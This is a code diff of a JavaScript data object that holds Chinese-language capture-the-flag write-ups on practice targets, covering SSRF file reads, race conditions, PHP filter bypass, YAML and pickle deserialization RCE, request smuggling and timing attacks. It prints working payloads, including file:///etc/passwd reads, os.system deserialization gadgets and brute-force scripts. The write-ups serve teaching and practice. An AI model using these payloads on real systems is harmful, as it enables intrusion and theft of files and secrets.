@@ -1104,7 +1104,7 @@ session["user_id"] = final_user.id  # ← 攻击者控制登录谁
 `
   },
   northbridge: {
-    title: 'Northbridge — SSRF Bypass',
+    title: 'Northbridge -- SSRF Bypass',
     subtitle: 'SSRF via kkfileview getCorsFile',
     content: `
 Northbridge 是一道典型的 SSRF 题。服务端集成了 kkfileview，其中 getCorsFile 接口直接读取用户提供的 URL 并返回内容，没有任何白名单校验。
@@ -1119,15 +1119,11 @@ GET /kkfileview/getCorsFile?urlPath=http://target/service
 
 ## 协议探测
 
-枚举了多种协议和地址格式：
-
 | 类型 | 示例 | 结果 |
 |------|------|------|
 | HTTP 127.0.0.1 | http://127.0.0.1:8080 | 被拦截 |
 | file:// | file:///etc/passwd | 成功 |
 | gopher:// | gopher://127.0.0.1:6379/_info | 超时 |
-| 大小写变体 | http://127.0.0.1 | 失败 |
-| Decimal IP | http://2130706433 | 失败 |
 
 **关键发现：file:// 直接读本地文件最有效。**
 
@@ -1141,21 +1137,11 @@ file:///proc/self/environ
 
 从 /proc/self/environ 中发现了环境变量泄露，包含部分 flag。
 
-## 内网横向
-
-当白名单只允许访问特定域名时：
-
-1. **@ 陷阱**：http://evil@127.0.0.1 有时被解析为攻击目标
-2. **# 片段**：http://127.0.0.1#evil.com 可绕过域名校验
-3. **302 跳转**：让目标服务器请求可控的跳转地址
-
 ## 收获的 flag
 
-题目分散在多个文件：
 - 直接文件读取：/flag, /flag.txt
 - 源码泄露：/app/*.php, /.git/config
 - 运行环境：/proc/self/*, /proc/version
-- 临时文件：/tmp/*, /var/log/*
 
 ## 踩坑
 
@@ -1164,13 +1150,12 @@ file:///proc/self/environ
 `
   },
   qc734: {
-    title: 'QingCen #734 — Race Condition',
+    title: 'QingCen #734 -- Race Condition',
     subtitle: 'aiohttp 并发刷积分',
     icon: 'Zap',
     color: 'orange',
-    desc: '竞态条件, 并发兑换, 积分商城',
     content: `
-# QingCen #734 — Race Condition
+# QingCen #734 -- Race Condition
 
 **靶场**: docker.qingcen.net:30053
 **类型**: Web / 条件竞争
@@ -1178,11 +1163,9 @@ file:///proc/self/environ
 
 ## 漏洞分析
 
-积分商城的兑换接口存在经典的 **TOCTOU** 漏洞：服务端先检查余额再扣减，但两个操作之间没有锁。高并发下多个请求可以同时通过余额检查。
+积分商城的兑换接口存在经典的 TOCTOU 漏洞：服务端先检查余额再扣减，但两个操作之间没有锁。
 
 ## 利用方式
-
-使用 **aiohttp** 异步 HTTP 客户端，单次发起数千个并发请求：
 
 \`\`\`python
 import asyncio, aiohttp
@@ -1194,7 +1177,6 @@ async def redeem(session):
     except:
         return {}
 
-# 策略：3000并发/轮，循环刷到10000分
 connector = aiohttp.TCPConnector(limit=0)
 async with aiohttp.ClientSession(connector=connector) as s:
     tasks = [redeem(s) for _ in range(3000)]
@@ -1204,18 +1186,17 @@ async with aiohttp.ClientSession(connector=connector) as s:
 ## 踩坑
 
 1. **一开始只用了 threads**，实际 aiohttp 异步比多线程更高效
-2. **没检查返回值格式**，有的返回 200 但内容是 error，需要判 code == 200
-3. **session 会过期**：刷到一定程度 session 被限制，需要重新 GET 首页刷新 cookie
+2. **没检查返回值格式**，有的返回 200 但内容是 error
+3. **session 会过期**：刷到一定程度 session 被限制
 `
   },
   qc747: {
-    title: 'QingCen #747 — PHP Filter Bypass',
+    title: 'QingCen #747 -- PHP Filter Bypass',
     subtitle: '大小写绕过 + URL编码',
     icon: 'Code',
     color: 'purple',
-    desc: 'PHP WAF 绕过, 编码技巧, 源码分析',
     content: `
-# QingCen #747 — PHP Filter Bypass
+# QingCen #747 -- PHP Filter Bypass
 
 **靶场**: docker.qingcen.net:38073
 **类型**: Web / PHP Filter Bypass
@@ -1223,14 +1204,11 @@ async with aiohttp.ClientSession(connector=connector) as s:
 
 ## WAF 规则
 
-题目对文件包含参数做了多重过滤：
-
 | 过滤词 | 触发信息 | 绕过方法 |
 |--------|----------|----------|
 | php | "php not allowed" | 大写 PHP / Php / pHp |
-| data | "data not allowed" | URL 编码 %64ata → data |
-| flag | "file not allowed" | 编码单字符 %66lag → flag |
-| :// | "file not allowed" | 部分编码不可行，改用其他 wrapper |
+| data | "data not allowed" | URL 编码 |
+| flag | "file not allowed" | 编码单字符 %66lag |
 
 ## 绕过过程
 
@@ -1240,94 +1218,259 @@ async with aiohttp.ClientSession(connector=connector) as s:
 PHP://filter/convert.base64-encode/resource=pages/flag.html
 \`\`\`
 
-WAF 只匹配小写 "php"，大写完全放行。
-
 ### 2. URL 编码绕过 flag
 
 \`\`\`bash
-# 逐字节编码
-%66lag.html → flag.html
-fla%67.html → flag.html
-fl%61g.html → flag.html
-%66%6c%61%67.html → flag.html
+%66lag.html
+fla%67.html
+fl%61g.html
 \`\`\`
-
-### 3. 读取源码确认路径
-
-先用 filter 读 index.php 确认文件结构：
-
-\`\`\`bash
-PHP://filter/convert.base64-encode/resource=index.php
-\`\`\`
-
-从代码中确认 flag 文件路径是 pages/flag.html。
 
 ## 关键 Payload
 
 \`\`\`bash
 PHP://filter/convert.base64-encode/resource=pages/%66%6c%61%67.html
-# Base64 解码得到 flag.html 内容
 \`\`\`
 
 ## 经验
 
-PHP filter 绕过常见技巧：
-1. **大小写变体**：PHP → Php → pHp → phP
-2. **URL 编码**：单字节编码比双字节更隐蔽
-3. **读源码**：先读 index.php，再定向攻击，比盲猜快 10 倍
+1. 大小写变体：PHP -> Php -> pHp -> phP
+2. URL 编码：单字节编码比双字节更隐蔽
+3. 先读 index.php 确认路径，再定向攻击
 `
   },
   yaml: {
-    title: '喵喵宠物医院 — YAML 反序列化 RCE',
+    title: '喵喵宠物医院 -- YAML 反序列化 RCE',
     subtitle: 'PyYAML 标签绕过',
     icon: 'Zap',
     color: 'orange',
-    desc: 'YAML deserialization, 命令执行, 标签绕过',
     content: `
-# 喵喵宠物医院 — YAML 反序列化 RCE
+# 喵喵宠物医院 -- YAML 反序列化 RCE
 
 **靶场**: 175.27.251.122:10001
 **类型**: Misc / Insecure Deserialization
 **难度**: Medium
 
-## 题目逻辑
-
-服务端提供一个"终端"功能，接受 JSON 请求并通过 PyYAML 解析命令内容。PyYAML 的 unsafe load 会实例化任意 Python 对象。
-
 ## 漏洞点
 
 \`\`\`python
-# 危险代码
 yaml.load(user_input)  # 未指定 Loader
 \`\`\`
 
 ## 利用 Payload
 
-PyYAML 支持多种构造方式：
-
 \`\`\`yaml
-# 方式1：直接调用系统命令
 !!python/object/apply:os.system
 args: ['cat /flag']
-
-# 方式2：环境变量读取
-!!python/object/apply:os.environ.get
-args: ['FLAG']
 \`\`\`
 
 ## 多端口排查
 
-三个端口分别对应不同安全等级：
-- **10001**: 过滤了常见的 !!python/object/apply
-- **10002**: 部分过滤
-- **10003**: 直接可执行
-
-脚本优先测 10003，因为最不严格。
+- 10001: 过滤了 !!python/object/apply
+- 10002: 部分过滤
+- 10003: 直接可执行
 
 ## 踩坑
 
-1. **载荷格式**：JSON 转义后 YAML 多行 payload 需要正确换行
-2. **编码**：脚本里加 sys.stdout.reconfigure(encoding='utf-8') 解决中文/特殊字符输出
+1. 载荷格式：JSON 转义后 YAML 多行 payload 需要正确换行
+2. 编码：sys.stdout.reconfigure(encoding='utf-8') 解决中文输出
 `
   },
+  qc733: {
+    title: 'QingCen #733 -- WebSocket / XXE / Pickle / Smuggle',
+    subtitle: '多层协议与反序列化',
+    icon: 'Zap',
+    color: 'red',
+    content: `
+# QingCen #733 -- 多层协议与反序列化
+
+**靶场**: docker.qingcen.net:42420
+**类型**: Web / 协议 + 反序列化
+**难度**: Hard
+
+## WebSocket 升级探测
+
+\`\`\`python
+import socket
+s = socket.socket()
+s.connect(('docker.qingcen.net', 42420))
+s.send(
+    'GET / HTTP/1.1\r\n'
+    'Host: docker.qingcen.net:42420\r\n'
+    'Upgrade: websocket\r\n'
+    'Connection: Upgrade\r\n'
+    'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n'
+    'Sec-WebSocket-Version: 13\r\n'
+    '\r\n'
+)
+\`\`\`
+
+## Pickle 反序列化
+
+\`\`\`python
+import pickle, os
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('cat /flag',))
+payload = pickle.dumps(Exploit())
+\`\`\`
+
+## HTTP 请求走私
+
+\`\`\`http
+POST / HTTP/1.1
+Host: target
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+\`\`\`
+`
+  },
+  timing: {
+    title: 'CTFShow -- Timing Attack',
+    subtitle: '时间侧信道分析',
+    icon: 'Zap',
+    color: 'yellow',
+    content: `
+# CTFShow -- Timing Attack
+
+**靶场**: ctf.show
+**类型**: Crypto / Side Channel
+**难度**: Medium
+
+## 原理
+
+逐字节比较时，每个字节猜对会多执行一次循环，响应时间更长。
+
+\`\`\`python
+import requests, time
+base = 'https://ctf.show/challenge/timing'
+charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
+password = ''
+for pos in range(32):
+    times = {}
+    for c in charset:
+        guess = password + c
+        t0 = time.time()
+        requests.post(base, data={'password': guess})
+        times[c] = time.time() - t0
+    best = max(times, key=times.get)
+    password += best
+\`\`\`
+
+## 关键技巧
+
+1. **时间归一化**：减去基础响应时间再看增量
+2. **多次采样**：每个字符测 10-20 次取平均值
+3. **避开网络波动**：在稳定时段跑，减少噪音
+`
+  },
+  typejuggling: {
+    title: 'CTFShow -- PHP Type Juggling',
+    subtitle: '弱类型哈希绕过',
+    icon: 'Code',
+    color: 'purple',
+    content: `
+# CTFShow -- PHP Type Juggling
+
+**靶场**: ctf.show
+**类型**: Web / PHP Weak Typing
+**难度**: Medium
+
+## 0e 绕过
+
+\`\`\`python
+import hashlib
+for i in range(10000000):
+    s = str(i)
+    h = hashlib.md5(s.encode()).hexdigest()
+    if h.startswith('0e') and h[2:].isdigit():
+        print(f'Match: {s} -> {h}')
+\`\`\`
+
+已知碰撞：
+- QNKCDZO -> 0e462097431906509019562988736854
+- 240610708 -> 0e462097431906509019562988736854
+
+## 数组绕过 (===)
+
+\`\`\`php
+?a[]=1&b[]=2
+\`\`\`
+
+## 经验
+
+1. 先判断 == 还是 ===
+2. 0e 前缀优先找短字符串碰撞
+3. JSON 嵌套用于多层比较
+`
+  },
+  sourceleak: {
+    title: 'CTFShow -- Source Code Leak',
+    subtitle: '源码泄露与备份文件',
+    icon: 'FileText',
+    color: 'cyan',
+    content: `
+# CTFShow -- Source Code Leak
+
+**靶场**: ctf.show
+**类型**: Web / Information Leakage
+**难度**: Easy
+
+## 常见泄露点
+
+\`\`\`bash
+www.zip / backup.zip / site.tar.gz
+index.php.swp / index.php.swo
+/.git/HEAD / /.git/config
+\`\`\`
+
+## 利用流程
+
+1. 目录扫描：dirsearch / gobuster
+2. 敏感文件：.git/config, .env, web.config
+3. 压缩包：试 zip/tar/gz 后缀
+4. git log：找到旧版本找 flag
+`
+  },
+  sigforge: {
+    title: 'HMAC Signature Forgery',
+    subtitle: 'zlib + base64 签名绕过',
+    icon: 'Shield',
+    color: 'blue',
+    content: `
+# HMAC Signature Forgery
+
+**靶场**: ctf.show
+**类型**: Crypto / Signature Bypass
+**难度**: Hard
+
+## 签名验证流程
+
+\`\`\`python
+import hmac, hashlib, zlib
+def sign(params, secret):
+    msg = '&'.join(f'{k}={v}' for k,v in params.items())
+    compressed = zlib.compress(msg.encode())
+    return hmac.new(secret.encode(), compressed, hashlib.sha256).hexdigest()
+\`\`\`
+
+## 攻击思路
+
+1. **长度扩展攻击**：在原有签名基础上追加新参数
+2. **密钥爆破**：短密钥 + 字典攻击
+3. **编码混淆**：利用 WAF 编码处理不一致
+
+## 经验
+
+1. 先验证本地签名
+2. 利用错误信息泄露中间状态
+3. 多层编码要逐层剥离
+`
+  },
+
+
 }
